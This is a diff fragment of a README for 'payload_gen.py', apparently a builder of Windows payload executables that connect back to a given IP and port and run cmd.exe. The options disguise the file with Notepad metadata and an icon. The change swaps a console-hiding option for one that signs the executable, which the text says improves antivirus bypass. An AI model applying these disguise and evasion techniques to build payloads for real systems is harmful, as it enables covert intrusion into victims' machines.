@@ -28,7 +28,7 @@ python3 payload_gen.py --ip 192.168.1.100 --port 4444 --notepad
 **--cmd** : Command to execute (default: cmd.exe).  
 **--notepad** : Mimic Notepad metadata and icon.  
 **--keep** : Keep temporary files (.c, .rc, .res) after building.  
-**--hidden** : Hide Windows console on execution (AVs evasion is more difficult...).  
+**--sign** : Uses sign_exe.py to sign the exe, improving AVs bypass.  
   
 ---
   
